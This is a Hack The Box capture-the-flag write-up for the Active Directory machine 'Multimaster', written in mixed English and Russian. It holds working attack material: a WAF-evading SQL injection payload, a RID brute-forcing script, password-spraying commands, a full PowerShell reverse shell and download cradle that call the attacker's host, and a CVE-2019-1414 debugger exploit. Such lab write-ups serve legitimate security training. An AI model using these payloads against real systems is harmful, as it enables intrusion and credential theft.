---
title: "[HTB] Multimaster"
permalink: /writeups/htb/multimaster/
excerpt: "Краткий разбор машины Multimaster с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - reverse
  - sqli
  - waf
  - reverse
  - asreproast
---

---

{% include toc icon="cog" title="Multimaster Solution" %}

The [Multimaster](https://app.hackthebox.com/machines/Multimaster) machine has been created by [MinatoTW](https://app.hackthebox.com/users/8308) and [egre55](https://app.hackthebox.com/users/1190). This is an **insane** Windows Machine with a strong focus on Active Directory exploitation. This box was really tricky, more CTF-style than real-world scenarios as the exploitation path was a bit weird, but it was an insane box so, no surprise here. However, some of the attacks were fun like the SQL injection and the VS Code exploit.
{: .text-justify}

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_multimaster_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.247.110  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 09:05 EDT
Nmap scan report for 10.129.247.110
Host is up (0.015s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-05 13:12:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.81 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

Here the host seems to be the domain controller of **megacorp.local**. We have a few interesting ports open including an **HTTP** (80/TCP) port and an **RDP** (3389/TCP) port.

## HTTP-разведка

Let's start with a bit of HTTP recon. By looking at the website hosted at *http://10.129.247.110* we found a login page. However, as per the error message, the login system does not seem to be working.

![image-center](/images/htb/htb_multimaster_login.png){: .align-center}

Another interesting finding was the **Colleague Finder** page. This page allowed us to get usernames.

![image-center](/images/htb/htb_multimaster_colleague_finder.png){: .align-center}

Here we used [Burp Suite](https://portswigger.net/burp), a well-known web proxy, in order to interact with the requests. By intercepting the HTTP **POST** request sent to the web server, it was possible to identify the **name** parameter. Maybe we could also try an SQL injection. 

![image-center](/images/htb/htb_multimaster_burp_01.png){: .align-center}

As we can see, by sending a request to */api/getColleagues* with the parameter **name** set as **"a"** we get multiple results. Note that we are dealing with the [JSON](/api/getColleagues) format. Now let's try to send a single quote (**'**) in the **name** parameter.

![image-center](/images/htb/htb_multimaster_burp_02.png){: .align-center}

This is interesting, we got an error message. Maybe we have an injection point, however, the error code could also indicate the presence of a WAF (Web Application Firewall) and we may need to encode our requests.

# SQL Injection

A [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) attack consists of the insertion of an SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data, execute administration operations on the database , recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. 

## Recon

Let's keep exploring this injection point. First, we will encode our single quote. Here we used a URL encoding scheme where all non-alphanumeric characters will be replaced with a percent (**%**) sign followed by two (2) hex digits.

![image-center](/images/htb/htb_multimaster_burp_03.png){: .align-center}

This time we don't have any error, but we also don't have any results. Given we are dealing with JSON, we may need to use another encoding scheme, like Unicode. In JSON, Unicode is represented like this **\uXXXX** where the **X**'s represent the hexadecimal value of our character.

![image-center](/images/htb/htb_multimaster_burp_04.png){: .align-center}

Nice, given we got **null** as response, we may have broken the request on the server side. Let's see if we can use [sqlmap](https://sqlmap.org) to automate this SQL injection. 


## Exploitation

Here, we saved the **Burp Suite** POST request in *post_me.txt* and specified the *charunicodeescape* tamper script to encode the queries performed by `sqlmap`. The `--delay 3` was found to be enough to avoid being blocked by the WAF.

**Заметка:** It took lots of time to find the proper `sqlmap` command. It was due to the WAF present on the remote system that was blocking us when sending multiple query in a row.
{: .notice--info}

```bash
$ sqlmap -r post_me.txt --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dbs -v 3                      

...[snip]...

[13:05:08] [INFO] parsing HTTP request from 'post_me.txt'
[13:05:08] [DEBUG] not a valid WebScarab log data
[13:05:08] [DEBUG] cleaning up configuration parameters
[13:05:08] [INFO] loading tamper module 'charunicodeescape'


...[snip]...

sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: JSON name ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"test' UNION ALL SELECT 49,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(118)+CHAR(113)+CHAR(103)+CHAR(115)+CHAR(105)+CHAR(112)+CHAR(81)+CHAR(103)+CHAR(102)+CHAR(83)+CHAR(100)+CHAR(80)+CHAR(108)+CHAR(101)+CHAR(105)+CHAR(114)+CHAR(118)+CHAR(68)+CHAR(107)+CHAR(89)+CHAR(110)+CHAR(112)+CHAR(114)+CHAR(67)+CHAR(84)+CHAR(120)+CHAR(86)+CHAR(73)+CHAR(114)+CHAR(90)+CHAR(69)+CHAR(83)+CHAR(105)+CHAR(74)+CHAR(116)+CHAR(98)+CHAR(68)+CHAR(108)+CHAR(79)+CHAR(115)+CHAR(80)+CHAR(88)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(106)+CHAR(113),49,49,49-- VUSA"}
    Vector:  UNION ALL SELECT 49,[QUERY],49,49,49[GENERIC_SQL_COMMENT]
---

...[snip]...

[13:08:44] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2019 or 10 or 2016
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[13:08:44] [INFO] fetching database names
available databases [5]:
[*] Hub_DB
[*] master
[*] model
[*] msdb
[*] tempdb
```

After finding the injection point and a potential query using `sqlmap`, we were able to discover a few databases (due to the `--dbs` switch). Most of them are system databases, but the **Hub_DB** is probably related to the application.

Let's execute `sqlmap` with the `--dump-all` switch to dump all databases tables entries and the `--exclude-sysdbs` to avoid the extraction of system databases.

```bash
$ sqlmap -r post_me.txt --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3

...[snip]...

[13:12:28] [INFO] parsing HTTP request from 'post_me.txt'
[13:12:28] [DEBUG] not a valid WebScarab log data
[13:12:28] [DEBUG] cleaning up configuration parameters
[13:12:28] [INFO] loading tamper module 'charunicodeescape'

...[snip]...

[13:12:41] [INFO] fetching entries for table 'Colleagues' in database 'Hub_DB'
Database: Hub_DB
Table: Colleagues
[17 entries]
+----+----------------------+----------------------+-------------+----------------------+
| id | name                 | email                | image       | position             |
+----+----------------------+----------------------+-------------+----------------------+
| 1  | Sarina Bauer         | sbauer@megacorp.htb  | sbauer.jpg  | Junior Developer     |
| 2  | Octavia Kent         | okent@megacorp.htb   | okent.jpg   | Senior Consultant    |
| 3  | Christian Kane       | ckane@megacorp.htb   | ckane.jpg   | Assistant Manager    |
| 4  | Kimberly Page        | kpage@megacorp.htb   | kpage.jpg   | Financial Analyst    |
| 5  | Shayna Stafford      | shayna@megacorp.htb  | shayna.jpg  | HR Manager           |
| 6  | James Houston        | james@megacorp.htb   | james.jpg   | QA Lead              |
| 7  | Connor York          | cyork@megacorp.htb   | cyork.jpg   | Web Developer        |
| 8  | Reya Martin          | rmartin@megacorp.htb | rmartin.jpg | Tech Support         |
| 9  | Zac Curtis           | zac@magacorp.htb     | zac.jpg     | Junior Analyst       |
| 10 | Jorden Mclean        | jorden@megacorp.htb  | jorden.jpg  | Full-Stack Developer |
| 11 | Alyx Walters         | alyx@megacorp.htb    | alyx.jpg    | Automation Engineer  |
| 12 | Ian Lee              | ilee@megacorp.htb    | ilee.jpg    | Internal Auditor     |
| 13 | Nikola Bourne        | nbourne@megacorp.htb | nbourne.jpg | Head of Accounts     |
| 14 | Zachery Powers       | zpowers@megacorp.htb | zpowers.jpg | Credit Analyst       |
| 15 | Alessandro Dominguez | aldom@megacorp.htb   | aldom.jpg   | Senior Web Developer |
| 16 | MinatoTW             | minato@megacorp.htb  | minato.jpg  | CEO                  |
| 17 | egre55               | egre55@megacorp.htb  | egre55.jpg  | CEO                  |
+----+----------------------+----------------------+-------------+----------------------+

...[snip]...

[13:12:47] [INFO] fetching entries for table 'Logins' in database 'Hub_DB'
Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+
```

Awesome! We now have a complete list of usernames and password hashes.

## Hashes Cracking

As the hash format does not seem to be familiar, we used a [random](https://hashes.com/en/tools/hash_identifier) hash identifier website to find out what it is. According to the website, the hash format might be **Keccak-384**, which is the algorithm used by **SHA-3**.

Let's go to the [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) hash reference to see what kind of *hash-mode* we need to use in order to crack those passwords. Then, we can run `hashcat`, with the following command:

```bash
hashcat -a 0 -m 17900 hashes /usr/share/wordlists/rockyou.txt
```

All the hashes were cracked execpt for the **minatotw** and **egre55** users.

```bash
banking1
finance1
password1
```

## Password spraying

Let's see if we can find a valid account on the remote machine with a password spraying attack. A **password spraying** attack uses a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.

```bash
$ crackmapexec smb 10.129.247.110 -u users.txt -p pass.txt 
SMB         10.129.247.110  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 

...[snip]...
```

No luck and this where we got stuck for a while...

# SQL Injection (again)

After multiple dead ends and rabbit holes, another SQL injection path was found.

## SIDs or RIDs

It took lots of time to find this reconnaissance vector, but it seems it is possible to do [Active Directory enumeration](https://keramas.github.io/2020/03/22/mssql-ad-enumeration.html) via an MSSQL injection using RID brute-force to find other usernames.

For domain accounts, the SID of a security principal is created by concatenating the SID of the domain with a relative identifier (RID) for the account (if you want more details [Microsoft](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) provides an extensive description of security identifiers). So, the concept is simple, we need to find the SID of the domain then, iterating over a range of RIDs to determine names for each of the objects. That way, it is possible to discover potential users that were not present in the database.

Here, with the [SUSER_SID()](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16) function we can get the security identification number (SID) for a specified login name and with the [SUSER_SNAME()](https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql?view=sql-server-ver16) function, we can get the login name associated with a security identification number (SID). 

There are many [well-known](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) RID like **512** for the **Domain Admins** group. Let's build a request to find out what if this attack works.

```bash
hello' UNION SELECT 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),3,4,5--
```
Note that we used the **sys.fn_varbintohexstr** function to convert the SID to hexadecimal since *SUSER_SID()* return a binary value.

Then, using [CyberChef](https://gchq.github.io/CyberChef/) and the *Escape Unicode Characters* module, we can encode our request.

![image-center](/images/htb/htb_multimaster_cyberchef.png){: .align-center}

Finally, we can send our payload using **Burp**.

![image-center](/images/htb/htb_multimaster_sid.png){: .align-center}

It worked! The obtained SID value (hexadecimal) is **56** bytes. The first **48** bytes are domain SID and the remaining **8** bytes are the RID. Now we have:

```text
- The full SID **0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000** (58 bytes)
- The domain SID **0x0105000000000005150000001c00d1bcd181f1492bdfc236** (48 bytes)
- The *Domain Admins* RID **0x00020000** (8 bytes) 
```

The RID have to be reversed, **0x00000200**, which is **512** in decimal the *Domain Admins* RID. 

As another proof of concept, given we now have the domain SID, let's see if we can build the Adminstrator's account SID (RID **500**):

```text
- **500** in hexadecimal is **0x1F4**
- We pad it with 0's **0x000001F4**
- We reverse it **0xf4010000**
- We add the domain SID **0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000**
```

It will give the following request:

```bash
hello' UNION SELECT 1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),3,4,5--
```

Now, we just need to encode it with [CyberChef](https://gchq.github.io/CyberChef/) and send it through **Burp**.

![image-center](/images/htb/htb_multimaster_sid_02.png){: .align-center}

Great, it worked. Let's do a small Python script to automate that and find valid SIDs.

```python
import json
import requests
from time import sleep

url = 'http://10.129.247.110/api/getColleagues'

# Encode our payload
def encode_me(str):
    val = []
    for i in str:
        val.append("\\u00"+hex(ord(i)).split("x")[1])
    
    return ''.join([i for i in val])

# Iterate RID
sid = ''
for i in range(500,10000):
    i = hex(i)[2:].upper()
    if len(i) < 4:
        i = '0' + i

    # Reverse our RID
    t = bytearray.fromhex(i)
    t.reverse()
    t = ''.join(format(x,'02x') for x in t).upper()+'0'*4

    # Build the request
    sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(t)
    payload = "hello' UNION SELECT 1,SUSER_SNAME({}),3,4,5--".format(sid)  
    r = requests.post(url,data='{"name":"'+ encode_me(payload) + '"}',headers={'Content-Type': 'Application/json'})

    user = json.loads(r.text)[0]["name"]

    if user:
        print(user)

    # Sleep to avoid triggering the WAF
    sleep(3)
```

We did an iteration from **RID 500** to **RID 10000**. After a while, we got some new users:

```bash
$ python3 sqli.py

...[snip]...

MEGACORP\svc-nas
MEGACORP\Privileged IT Accounts
MEGACORP\tushikikatomo
MEGACORP\andrew
MEGACORP\lana

```


# Первичный доступ



## WinRM

With these new usernames, we can retry our password spraying attack and find out if we have valid credentials.

```bash
$ crackmapexec smb 10.129.247.110 -u users.txt -p pass.txt --continue-on-success
SMB         10.129.247.110  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:banking1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:finance1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:password1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 

...[snip]...
```

Finally! We have valid credentials for the **tushikikatomo** domain account (`tushikikatomo:finance1`). 

Again, with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's can access to the remote machine with WinRM.

```bash
$ crackmapexec winrm 10.129.247.110 -u tushikikatomo -p finance1
SMB         10.129.247.110  5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        10.129.247.110  5985   MULTIMASTER      [*] http://10.129.247.110:5985/wsman
WINRM       10.129.247.110  5985   MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)
```

We now have a remote shell access and the **first flag**.

```bash
$ evil-winrm -i 10.129.247.110 -u tushikikatomo -p finance1             

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents> cd ..
*Evil-WinRM* PS C:\Users\alcibiades> cd Desktop
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> ls


    Directory: C:\Users\alcibiades\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/5/2022  10:07 AM             34 user.txt
```


## Host Recon

Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's see if we have any issues that can be leveraged for local privilege escalation.

Note that we used the local **Apache** service to host the file and download it from the remote machine. The `-Extended` flag aims to gather more information.

```bash
*Evil-WinRM* PS C:\Users\alcibiades\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

...[snip]...

+------+------------------------------------------------+------+
| TEST | APPS > Non-default Apps                        | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate non-default and third-party applications by |
|      | parsing the registry.                                 |
+------+-------------------------------------------------------+
[*] Found 8 result(s).

Name                         FullName
----                         --------
Microsoft SQL Server         C:\Program Files (x86)\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files (x86)\Microsoft Visual Studio 10.0
Microsoft                    C:\Program Files\Microsoft
Microsoft SQL Server         C:\Program Files\Microsoft SQL Server
Microsoft Visual Studio 10.0 C:\Program Files\Microsoft Visual Studio 10.0
Microsoft VS Code            C:\Program Files\Microsoft VS Code
VMware                       C:\Program Files\VMware
VMware Tools                 C:\Program Files\VMware\VMware Tools

...[snip]...

+------+------------------------------------------------+------+
| TEST | APPS > Running Processes                       | INFO |
+------+------------------------------------------------+------+
| DESC | List processes that are not owned by the current user |
|      | and filter out common processes such as               |
|      | 'svchost.exe'.                                        |
+------+-------------------------------------------------------+
[*] Found 37 result(s).

Name                                    Id Path SessionId User
----                                    -- ---- --------- ----
Code                                   888              1
Code                                  2408              1
Code                                  2876              1
Code                                  3760              1
Code                                  4864              1
Code                                  4964              1
Code                                  5928              1

```

Following the scan, we didn't find any specific vulnerability. However, *PrivescCheck* showed that we have **Microsoft VS Code** installed and it is executed multiple time on the machine. It's definitely weird.

Let's see which version it is running.

```bash
*Evil-WinRM* PS C:\Program Files\Microsoft VS Code> (get-command .\Code).version

Major  Minor  Build  Revision
-----  -----  -----  --------
1      37     1      0
```

After a quick search, we found out that this version was vulnerable to the [CVE-2019-1414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1414) exploit.

Basically, an elevation of privilege vulnerability exists in Visual Studio Code when it exposes a debug listener to users of a local computer. A local attacker who successfully exploited the vulnerability could inject arbitrary code to run in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system.

# Повышение привилегий

Depending on which user is running **VS Code**, we might get elevated privileges on the target computer.

## CVE-2019-1414

We found a nice [post](https://iwantmore.pizza/posts/cve-2019-1414.html) detailing how to exploit this vulnerability. Moreover, Tavis Ormandy wrote a tool, [cefdebug](https://github.com/taviso/cefdebug), that can help us for this exploitation.

First, let's download the [release](https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip) of `cefdebug` and upload it to the remote machine. Here we used *C:\Windows\Tasks* as a target folder.

```bash
*Evil-WinRM* PS C:\Windows\Tasks> upload /home/ax/Downloads/cefdebug/cefdebug.exe
Info: Uploading /home/ax/Downloads/cefdebug/cefdebug.exe to C:\Windows\Tasks\cefdebug.exe                                                         
Data: 346112 bytes of 346112 bytes copied

Info: Upload successful!
```

Then, we can scan the local machine to find CEF debuggers. Note that `cefdebug` could generate some errors, but it does not impact the results.

```bash
*Evil-WinRM* PS C:\Windows\Tasks> .\cefdebug.exe
cefdebug.exe : [2022/06/05 12:48:20:6757] U: There are 3 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2022/06/05 12:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/06/05 12:48:40:7132] U: There were 1 servers that appear to be CEF debuggers.
[2022/06/05 12:48:40:7132] U: ws://127.0.0.1:42816/1c6e24ab-61a4-4ebc-a32f-e841c1f91476
```

We found a server that appears to be CEF debuggers. Nice, we might be able to get a shell as the user running **VS Code**. To avoid triggering a potential anti-malware solution, we used the following PowerShell reverse shell.

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.20',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
```

Then, we stared a listener on the Kali machine.

```bash
$ sudo nc -lnvp 8080
```

Finally, we can use a PowerShell download cradle and `cefdebug.exe` to download and execute the reverse shell using the servers that run the CEF debuggers.

```bash
.\cefdebug.exe --url ws://127.0.0.1:42816/1c6e24ab-61a4-4ebc-a32f-e841c1f91476 --code "process.mainModule.require('child_process').exec('powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.14.20/shell02.ps1\')')"
```

Awesome, we got a shell as **cyork**.

```bash
$ sudo nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.20] from (UNKNOWN) [10.129.247.110] 50437

PSReverseShell# whoami
megacorp\cyork
```

Let's do some reconnaissance as **cyork**.

## More recon

After looking around for a while, we discovered that **cyork** was able to read the content of *c:\inetpub* and discovered a DLL called **MultimasterAPI.dll**.

```bash
PSReverseShell# cd c:\inetpub\wwwroot\bin
PSReverseShell# dir


    Directory: C:\inetpub\wwwroot\bin


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         1/7/2020   9:28 PM                roslyn                                                                
-a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
-a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
-a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
-a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
-a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
-a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
-a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
-a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
-a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
-a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
-a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
-a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
-a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
-a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
-a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
-a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
-a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
-a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
-a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
-a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                     
```


## Reverse Engineering

Alright, let's download **MultimasterAPI.dll** and fire up a Windows machine with [dnSpy](https://github.com/dnSpy/dnSpy) installed. **dnSpy** is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available.

After a few minutes of reverse, we found a database connection string with an hardcoded password.

![image-center](/images/htb/htb_multimaster_dnspy.png){: .align-center}

Using `crackmapexec` we can execute another password spraying attack using this password and see if it yields any results.

```bash
$ crackmapexec smb 10.129.247.110 -u users.txt -p 'D3veL0pM3nT!'
SMB         10.129.247.110  445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\svc-nas:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.247.110  445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 
```

Nice, we have credentials for the `sbauer` domain account (`sbauer:D3veL0pM3nT!`).


## Domain Recon

